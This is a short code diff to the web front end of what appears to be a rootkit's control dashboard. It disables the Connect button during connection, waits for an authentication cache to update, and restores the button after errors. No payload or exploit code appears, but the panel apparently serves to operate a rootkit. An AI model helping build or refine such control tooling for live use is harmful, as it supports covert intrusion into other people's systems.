@@ -19,7 +19,7 @@
                 autofocus
                 onkeypress="if(event.key === 'Enter') connectToRootkit()"
             >
-            <button onclick="connectToRootkit()">Connect</button>
+            <button onclick="connectToRootkit()" id="connect_button">Connect</button>
         </span>
     </div>
 </div>
@@ -51,15 +51,31 @@
     // === Connection Logic ===
 
     async function connectToRootkit() {
+        // disable button to prevent multiple clicks
+        const connectButton = document.getElementById('connect_button');
+        connectButton.disabled = true;
+        const connectButtonText = connectButton.textContent;
+        connectButton.textContent = 'Connecting...';
+
         const details = document.getElementById('connect-input').value;
         const response = await sendCommand(URL_CONNECT, details);
         const errorMessage = document.querySelector('.error-message');
 
         if (response.status === 200) {
-            errorMessage.textContent = '';
-            errorMessage.classList.add('hidden');
-            closeConnectModal();
-            updateDashboard();
+            // wait clientInfoCache to be updated
+            const isCacheUpdated = new Promise(resolve => {
+                const interval = setInterval(() => {
+                    if (clientInfoCache.authenticated === true) {
+                        clearInterval(interval);
+                        resolve();
+                    }
+                }, 200);
+            }).then(() => {
+                errorMessage.textContent = '';
+                errorMessage.classList.add('hidden');
+                closeConnectModal();
+                updateDashboard();
+            });
         } else {
             const errorText =
                 response.status === 403
@@ -70,6 +86,9 @@
 
             errorMessage.textContent = errorText;
             errorMessage.classList.remove('hidden');
+            // Re-enable button after error
+            connectButton.disabled = false;
+            connectButton.textContent = connectButtonText;
         }
     }
 
